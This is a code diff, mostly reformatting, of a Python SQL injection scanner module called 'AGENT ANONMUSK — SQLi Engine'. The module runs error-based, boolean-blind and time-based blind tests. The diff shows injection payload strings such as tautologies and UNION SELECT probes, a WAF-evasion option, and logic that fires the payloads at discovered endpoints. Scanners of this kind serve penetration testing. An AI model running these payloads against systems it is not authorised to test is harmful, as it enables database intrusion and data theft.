@@ -1,4 +1,4 @@
-﻿"""
+"""
 AGENT ANONMUSK — SQLi Engine
 ============================
 SQL injection detection: error-based, boolean-blind, and time-based blind.
@@ -10,7 +10,7 @@ import logging
 import re
 import time
 
-from core.context import Evidence, Finding, Severity, VulnType
+from core.context import Finding, Severity, VulnType
 from modules.base import BaseModule
 from utils.http_client import HTTPClient
 
@@ -61,11 +61,11 @@ DB_ERROR_PATTERNS = {
 # ── Error-Based Payloads ─────────────────────────────────────
 ERROR_PAYLOADS = [
     "'",
-    "\"",
+    '"',
     "' OR '1'='1",
-    "\" OR \"1\"=\"1",
+    '" OR "1"="1',
     "' OR 1=1--",
-    "\" OR 1=1--",
+    '" OR 1=1--',
     "1' AND '1'='1",
     "' UNION SELECT NULL--",
     "') OR ('1'='1",
@@ -117,10 +117,7 @@ class SQLiEngine(BaseModule):
         params_to_test = self._attack_params.get("parameters", [])
 
         if not target_urls:
-            target_urls = [
-                ep.url for ep in self.ctx.endpoints
-                if ep.interesting and ep.params
-            ]
+            target_urls = [ep.url for ep in self.ctx.endpoints if ep.interesting and ep.params]
 
         if not target_urls:
             self._log_complete("No endpoints with parameters to test")
@@ -136,9 +133,7 @@ class SQLiEngine(BaseModule):
             timeout=max(scan_config.get("request_timeout", 15), blind_delay + 10),
         ) as client:
             for url in target_urls[:20]:
-                await self._test_endpoint(
-                    client, url, params_to_test, waf_evasion, blind_delay
-                )
+                await self._test_endpoint(client, url, params_to_test, waf_evasion, blind_delay)
 
         self._log_complete("SQLi testing complete")
 
@@ -213,9 +208,7 @@ class SQLiEngine(BaseModule):
                         ),
                     )
                     self.ctx.add_finding(finding)
-                    logger.warning(
-                        "💉 SQLi (error-based) found: %s [%s]", url, db_type
-                    )
+                    logger.warning("💉 SQLi (error-based) found: %s [%s]", url, db_type)
                     return True
 
             except Exception as e:
@@ -223,15 +216,13 @@ class SQLiEngine(BaseModule):
 
         return False
 
-    async def _test_boolean_blind(
-        self, client: HTTPClient, url: str, param: str
-    ) -> bool:
+    async def _test_boolean_blind(self, client: HTTPClient, url: str, param: str) -> bool:
         """Test for boolean-blind SQL injection."""
         try:
             # Get baseline
             baseline_url = self._inject_param(url, param, "1")
             baseline_resp, _ = await client.get(baseline_url)
-            baseline_len = len(baseline_resp.text)
+            _ = len(baseline_resp.text)
 
             # True condition
             true_url = self._inject_param(url, param, BOOLEAN_TRUE)
@@ -278,9 +269,7 @@ class SQLiEngine(BaseModule):
 
         return False
 
-    async def _test_time_blind(
-        self, client: HTTPClient, url: str, param: str, delay: int
-    ) -> bool:
+    async def _test_time_blind(self, client: HTTPClient, url: str, param: str, delay: int) -> bool:
         """Test for time-based blind SQL injection."""
         for db_type, payload_template in TIME_PAYLOADS.items():
             payload = payload_template.format(delay=delay)
@@ -312,7 +301,9 @@ class SQLiEngine(BaseModule):
                     self.ctx.add_finding(finding)
                     logger.warning(
                         "💉 SQLi (time-blind) found: %s [%s, %.1fs]",
-                        url, db_type, elapsed,
+                        url,
+                        db_type,
+                        elapsed,
                     )
                     return True
 
